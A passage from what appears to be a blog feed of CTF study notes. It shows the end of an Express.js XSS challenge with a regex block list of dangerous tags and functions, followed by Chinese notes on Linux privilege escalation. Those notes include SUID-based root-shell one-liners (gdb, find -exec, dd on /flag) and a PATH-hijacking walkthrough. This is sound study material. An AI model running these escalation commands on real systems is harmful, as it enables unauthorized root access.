&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;Invalid credentials!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> currentUser = req.<span class="property">session</span>.<span class="property">user</span>;</span><br><span class="line">        <span class="keyword">let</span> filteredPosts = [];</span><br><span class="line">        <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;currentUser.role&#125;</span>`</span>, &#123; <span class="attr">posts</span>: filteredPosts, <span class="attr">user</span>: currentUser &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/post&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> &#123; content &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> scriptTagRegex = <span class="regexp">/&lt;script\b[^&lt;]*(?:(?!&lt;\/script&gt;)&lt;[^&lt;]*)*&lt;\/script&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(scriptTagRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> eventHandlerRegex = <span class="regexp">/on\w+\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(eventHandlerRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> javascriptURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*javascript:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(javascriptURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dataURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*data:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dataURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> cssExpressionRegex = <span class="regexp">/style\s*=\s*([&quot;&#x27;]).*?expression\([^&gt;]*?\).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(cssExpressionRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousTagsRegex = <span class="regexp">/&lt;\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^&gt;]*?&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousTagsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousAttributesRegex = <span class="regexp">/\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousAttributesRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousProtocolsRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])(?:\s*javascript:|vbscript:|file:|data:|filesystem:).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousProtocolsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousFunctionsRegex = <span class="regexp">/\b(?:eval|alert|prompt|confirm|console\.log|Function)\s*\(/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousFunctionsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        posts.<span class="title function_">push</span>(&#123; <span class="attr">content</span>: content, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">username</span>, <span class="attr">role</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="title function_">destroy</span>();</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_admin&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;admin&quot;</span>,<span class="title class_">AdminPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_privileged&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;privileged&quot;</span>,<span class="title class_">PrivilegedPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(store);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>) &#123;</span><br><span class="line">            store.<span class="title function_">push</span>(req.<span class="property">body</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Data stored successfully&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No data received&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">                fs.<span class="title function_">readFile</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading flag file:&#x27;</span>, err);</span><br><span class="line">                        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">`Your Flag Here: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unauthorized!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error fetching flag:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> router;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权</title>
      <link href="/2024/11/04/Linux%E6%8F%90%E6%9D%83/"/>
      <url>/2024/11/04/Linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="*Ref"></a>*Ref</h2><ol><li>特权教程<ol><li><a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">多种提权姿势都有讲到</a></li><li><a href="https://blog.csdn.net/st3pby/article/details/127718846">很好的文章！数据库等提权</a></li></ol></li><li>linux命令手册<ol><li><a href="https://linux.die.net/">官方</a></li><li><a href="https://www.linuxcool.com/">民间教程</a></li></ol></li><li>T00ls<ol><li><strong>终极大杀器</strong><a href="https://gtfobins.github.io/">GTFOBins</a><ol><li>GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制<ol><li>该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为其他事后利用任务提供便利</li></ol></li><li><strong>only 参照表:</strong> 需要注意的是，这不是一个漏洞列表，这里列出的程序本身并不容易受到攻击，相反，GTFOBins是一个概要，说明当您只有某些二进制文件可用时，如何获得root权限。</li></ol></li></ol></li></ol><h2 id="Linux权限基本概念"><a href="#Linux权限基本概念" class="headerlink" title="Linux权限基本概念"></a>Linux权限基本概念</h2><h3 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h3><ol><li>Linux 是一个多用户操作系统，每个用户都有自己的用户名和密码，并且可以属于一个或多个用户组</li><li><em><strong>进程权限:</strong></em> 每个进程都会以某个特定的用户身份运行，该进程的权限受该用户权限的限制</li><li><em><strong>文件权限:</strong></em> 在 Linux 中，文件和目录都有所有权和权限设置。这些权限决定了哪些用户可以读取、写入或执行文件。当一个进程试图访问文件时，它只能根据其运行的用户身份所具有的权限来进行操作</li></ol><h3 id="进程权限继承"><a href="#进程权限继承" class="headerlink" title="进程权限继承"></a>进程权限继承</h3><ol><li>linux中子进程从父进程那里继承一定的权限和属性</li><li>用户和组 ID 继承 –&gt; 对文件读写权限的继承<ol><li>Real User ID, RUID：表示启动进程的实际用户</li><li>Effective User ID, EUID：用于确定进程的权限。</li><li>Saved Set User ID, SUID：用于在切换用户 ID 时存储原来的 EUID</li><li>Real Group ID, RGID：表示启动进程的实际用户组</li><li>Effective Group ID, EGID：用于确定进程的组权限</li><li>Supplementary Group IDs：表示进程所属的其他组</li></ol></li><li>文件描述符继承<ol><li>子进程会继承父进程打开的文件描述符。这意味着如果父进程打开了某个文件或网络连接，子进程也可以访问这些资源</li></ol></li><li>环境变量继承</li><li>资源限制继承</li><li><em><strong>特殊权限位</strong></em><ol><li>Set-User-ID (SUID)：如果可执行文件设置了 SUID 位，那么运行该文件的进程的有效用户 ID (EUID) 将是文件所有者的用户 ID，而不是运行该文件的用户的 ID</li><li>Set-Group-ID (SGID)：如果可执行文件设置了 SGID 位，那么运行该文件的进程的有效组 ID (EGID) 将是文件所有者的组 ID，而不是运行该文件的用户的组 ID</li></ol></li></ol><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><h3 id="suid-ref"><a href="#suid-ref" class="headerlink" title="*suid ref"></a>*suid ref</h3><ol><li><a href="https://gtfobins.github.io/#+suid">github quick find payload</a></li><li><a href="https://blog.csdn.net/CoreNote/article/details/122093180">suid解释得挺好的</a></li><li><a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">对应的suid章节附加命令很全面</a></li><li><a href="https://xz.aliyun.com/t/12535?time__1311=GqGxuCitqWq052x+xCq47wgRDnmDRi2=oD">附加一些额外的东西和命令，适合助眠</a></li><li><a href="https://cloud.tencent.com/developer/article/1878212">这篇也有一些命令</a></li><li><a href="https://www.cnblogs.com/yuy0ung/articles/18421470">suid更加深层的利用方法</a></li></ol><h3 id="什么是suid"><a href="#什么是suid" class="headerlink" title="什么是suid?"></a>什么是suid?</h3><ol><li><p>除了rwx，在linux还有三种特殊权限</p><ol><li>SUID(set user id)<ol><li>仅对二进制程序有效（binary program）</li><li>执行者对于该程序需要具有x的可执行权限</li><li>本权限仅在执行该程序的过程中有效（run-time）</li><li><strong>执行者将具有该程序拥有者的权限</strong></li></ol></li><li>SGID(set group id)<ol><li>SGID对二进制文件有用；</li><li>程序执行者对该程序来说，具有x权限；</li><li><strong>执行者在执行的过程中将获得该程序群组的权限</strong></li><li>用于二进制可执行文件上以及目录上，此目录新建的文件的所属组将自动从此目录继承</li></ol></li><li>Sticky Bit<ol><li>SBIT只针对目录有效</li><li>除非目录的属主和root用户有权限删除它，除此之外其它用户不能删除和修改这个目录 -&gt; 表示此目录的文件只能由所有者自己来删除</li><li>当 SGID 权限位应用于目录时，新创建的文件和子目录将自动继承该目录的所属组而不是创建者的组</li></ol></li></ol></li><li><p><em><strong>为什么需要suid？</strong></em></p><ol><li>例如用户想修改自己的密码，但是修改涉及到 &#x2F;etc&#x2F;shadow 文件，这个文件只有 root 权限才能修改，这时候 passwd 命令就设置了特殊权限，修改密码时临时使用了 root 的权限去修改 shadow 文件</li></ol></li><li><p><em><strong>如何进行设置</strong></em></p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s filename   <span class="comment">#设置SUID位</span></span><br><span class="line"><span class="built_in">chmod</span> u-s filename   <span class="comment">#去掉SUID设置</span></span><br><span class="line"><span class="built_in">chmod</span> 4750 file      <span class="comment"># 在4750中，4说明SUID位被设置，7为所有者读写执行权限</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="suid提权实战注意点"><a href="#suid提权实战注意点" class="headerlink" title="suid提权实战注意点"></a>suid提权实战注意点</h3><ol><li>步骤<ol><li>查找具备 suid 权限且属主是 root 的文件</li><li>查找对应文件的利用方法（不是所有文件均可利用，需要结合时间成本考虑是否进行利用）</li></ol></li><li>Set-UID (SUID) 权限位的用户不一定是 root。SUID 权限位可以使文件在执行时，其有效用户 ID (EUID) 变成文件所有者的用户 ID，而这个所有者可以是任何用户，不仅仅是 root –&gt; <strong>所以建议使用<code>-user root</code>选项来筛查</strong></li><li><strong>自动预警</strong>: <code>find / -perm -4000 2&gt; /dev/null</code>这类查找系统 suid 特殊权限的命令被各大 HIDS 系统列入检测范围，很容易被检测出来</li></ol><h3 id="suid提权实战"><a href="#suid提权实战" class="headerlink" title="*suid提权实战"></a>*suid提权实战</h3><blockquote><p>真题可见PyBlockly_强网24</p></blockquote><ol><li><p>先查查文件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 直接查找</span></span><br><span class="line">   <span class="comment"># 建议-user root，之后还要 ls -al 进一步查看是否当前用户可以执行</span></span><br><span class="line">   find ／ ﹣user root ﹣perm ﹣4000</span><br><span class="line">       <span class="comment"># -user root：查找属于 root 用户的文件。</span></span><br><span class="line">       <span class="comment"># -perm -4000：查找具有 SUID 权限位的文件。-4000 表示文件的权限位中包含 SUID 位。如果是 4000 则是指准确位4000的权限位。+4000 现在可以先不管</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null</span><br><span class="line">   find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 一套带走</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null | <span class="keyword">while</span> <span class="built_in">read</span> file; <span class="keyword">do</span> <span class="built_in">ls</span> -l <span class="string">&quot;<span class="variable">$file</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">      <span class="comment"># 无法直接 find / -perm -4000 2&gt; /dev/null | ls -l，原因是 ls -l 期望接收的是文件名参数，而不是标准输入。find 命令的输出通过管道传递给 ls -l，但 ls -l 并不会从标准输入读取文件名，而是将整个输入视为一个字符串</span></span><br><span class="line">      <span class="comment"># find 也会查找隐藏文件</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null | xargs <span class="built_in">ls</span> -l</span><br><span class="line">   find / -perm -4000 -print0 2&gt; /dev/null | xargs -0 <span class="built_in">ls</span> -l</span><br><span class="line">      <span class="comment"># 需要 xargs，但是没有试成功，应该是一次性输出这样的，文件少可以马上</span></span><br><span class="line">   find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">      <span class="comment"># -exec command &#123;&#125; \;</span></span><br><span class="line">      <span class="comment"># &#123;&#125;：一个占位符，表示 find 命令找到的每个文件。</span></span><br><span class="line">      <span class="comment"># \;：表示 -exec 选项的结束。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>通过语言运行开shell</strong>，如使用gdb进行命令执行(新开一个有root的shell): <code>gdb -nx -ex &#39;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39; -ex quit</code></p></li><li><p><strong>文件处理</strong>，如dd处理磁盘相关可以用来复制文件等，PyBlockly_强网24中就有用: <code>dd if=/flag of=/tmp/flag</code></p></li><li><p><strong>命令附加执行</strong>，如find有那么直接用find -exec，一个思路</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find ./already_existed -<span class="built_in">exec</span> /bin/sh -p \;</span><br><span class="line">find /usr/bin/su -<span class="built_in">exec</span> /bin/bash -p \; -quit    <span class="comment"># 利用find得到一个root权限的shell，su是具有suid权限的file</span></span><br><span class="line">find / -<span class="built_in">exec</span> /bin/sh -p \;  <span class="comment"># 一样可得到一个root权限的shell</span></span><br><span class="line"></span><br><span class="line">find /usr/bin/su -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure></li></ol><h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><blockquote><p>环境变量的提权立足于suid提权上，思想是suid的思想，只是利用了环境变量的特性，牢记目的是要提权</p></blockquote><h3 id="环境变量ref"><a href="#环境变量ref" class="headerlink" title="*环境变量ref"></a>*环境变量ref</h3><ol><li><a href="https://www.freebuf.com/articles/system/320593.html">虽然不是很直观，但是慢慢看还是很细的，重要的是参考资料很好</a></li><li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">一些示例</a><ol><li>出现<code>system(&#39;cat /file.txt&#39;)</code>这种时竟然不用管闭合，只需要直接<code>echo &#39;/bin/sh&#39; &gt; cat</code>就ok</li></ol></li><li><a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">这篇的环境变量提权部分</a><ol><li><em><strong>有修改环境变量的具体命令</strong></em></li></ol></li><li>**<a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">p牛</a></li></ol><h3 id="什么是环境变量"><a href="#什么是环境变量" class="headerlink" title="什么是环境变量"></a>什么是环境变量</h3><ol><li><p>常见的环境变量: 可以看见$PATH只是环境变量中的一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PATH：定义了系统在查找可执行文件时搜索的目录列表。</span><br><span class="line">HOME：用户的家目录。</span><br><span class="line">USER：当前登录用户的用户名。</span><br><span class="line">LANG：设定用户界面的语言。</span><br><span class="line">SHELL：用户使用的 shell 程序。</span><br><span class="line">TERM：终端类型。</span><br><span class="line">PS1：bash shell 提示符格式。</span><br><span class="line">LD_LIBRARY_PATH：动态链接器搜索共享库的路径。</span><br><span class="line">LD_PRELOAD：指定在程序启动时预先加载的共享库</span><br></pre></td></tr></table></figure></li><li><p>相关文件</p><ol><li>兼容性：不同的 shell（如 bash、zsh）可能有不同的环境变量配置文件，这里是bash的</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2. 修改系统级环境变量：</span><br><span class="line">编辑 /etc/environment 文件。</span><br><span class="line">编辑 /etc/profile 文件。</span><br><span class="line">编辑 /etc/profile.d/ 目录下的脚本文件。</span><br><span class="line"></span><br><span class="line">3. 修改用户级环境变量：</span><br><span class="line">编辑 ~/.bashrc 文件。</span><br><span class="line">编辑 ~/.profile 文件。</span><br><span class="line">编辑 ~/.bash_profile 文件（适用于登录 shell）</span><br></pre></td></tr></table></figure></li></ol><h3 id="PATH的作用"><a href="#PATH的作用" class="headerlink" title="$PATH的作用"></a>$PATH的作用</h3><ol><li><em><strong>当执行一个命令时查找可执行文件的顺序</strong></em><ol><li>S1 解析命令: shell（如 Bash）会首先解析该命令。命令可以是内置命令、外部命令或脚本</li><li>S2 直接指定路径: shell直接查找执行</li><li>S3 内置命令直接执行</li><li>S4 $PATH变量查找: 如果命令不是内置命令，shell 会<strong>依次</strong>检查 PATH 环境变量。PATH 环境变量是一个由冒号（:）分隔的目录列表，指定了系统在查找可执行文件时搜索的目录顺序</li><li>S5 命令未找到: 如果在所有指定的目录中都没有找到匹配的文件，shell 会返回“命令未找到”的错误信息</li></ol></li><li>关于$PATH<ol><li><p><strong>典型的环境值</strong></p><ol><li>关于sbin: Sbin（Superuser Binary的缩写）这个目录也是用来存放二进制文件的，但它主要存放的是系统管理员使用的管理工具。例如，&#x2F;sbin目录下的命令通常需要超级用户权限才能执行</li></ol></li><li><p><strong>可以用.来设置动态当前目录</strong>，替代：需要临时在当前目录中运行可执行文件，可以使用 .&#x2F; 前缀</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/sbin：本地安装的系统管理命令。</span><br><span class="line">/usr/local/bin：本地安装的用户命令。</span><br><span class="line">/usr/sbin：系统管理命令。</span><br><span class="line">/usr/bin：用户命令。</span><br><span class="line">/sbin：基本系统管理命令，通常在启动和修复系统时使用。</span><br><span class="line">/bin：基本用户命令，通常在启动和修复系统时使用。</span><br><span class="line">   <span class="comment"># 超级用户的 PATH 通常包含 /sbin 和 /usr/sbin 和 /usr/local/sbin</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="利用原理与大大大前提"><a href="#利用原理与大大大前提" class="headerlink" title="利用原理与大大大前提"></a>利用原理与大大大前提</h3><ol><li>利用原理<ol><li>S1: 命名一个和这个系统命令相同的文件，写入&#x2F;bin&#x2F;bash, 再将存放这个文件的路径加入环境变量中(要在前面的位置)</li><li>S2: 当系统去执行这个带有系统命令的文件时，就会直接执行我们命名和这个系统命令相同的文件，而非真实的系统命令；从而实现劫持环境变量提权</li></ol></li><li>前提<ol><li>原有shell中运行的命令不是内置命令</li><li>系统中存在带有suid的文件，且这个文件中必须有系统命令</li><li>同时这个文件也应该符合suid提权利用要求在我们当前用户具有执行权限</li><li>可以修改环境变量并在首部添加</li></ol></li></ol><h3 id="PATH实战"><a href="#PATH实战" class="headerlink" title="*$PATH实战"></a>*$PATH实战</h3><ol><li><p>过一个流程</p><ol><li>记得赋予执行权限</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># suid部分不做流程，这里已知 /shell 执行 ps命令</span></span><br><span class="line"><span class="built_in">cd</span> /tmp </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; ps     或者   <span class="built_in">cp</span> /bin/sh /tmp/ps</span><br><span class="line"><span class="built_in">chmod</span> 777 ps</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span>  <span class="comment">#把tmp设置在环境变量头部让系统在执行ps命令的时候先检索到tmp目录下的ps</span></span><br><span class="line">ehco <span class="variable">$PATH</span>  <span class="comment">#检查是否成功把/tmp  设置在了环境变量的头部</span></span><br><span class="line">./shell  <span class="comment">#执行shell文件，触发我们劫持的ps命令（此时sysyem运行的ps这个命令是root权限），但是此时实际执行的是  /bin/sh   ，也就是相当于以root权限去执行/bin/sh从而实现提权</span></span><br></pre></td></tr></table></figure></li><li><p><strong>使用xxd&#x2F;运行(利用报错信息)查看shell参数</strong>: 我们会遇到一种情况是给定的shell文件是已经编译好的文件，此时可以使用xxd来获取参数<code>xxd /shell</code></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> all in one </tag>
            
            <tag> root </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Proxy_强网24</title>
      <link href="/2024/11/03/Proxy_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/03/Proxy_%E5%BC%BA%E7%BD%9124/</url>
      
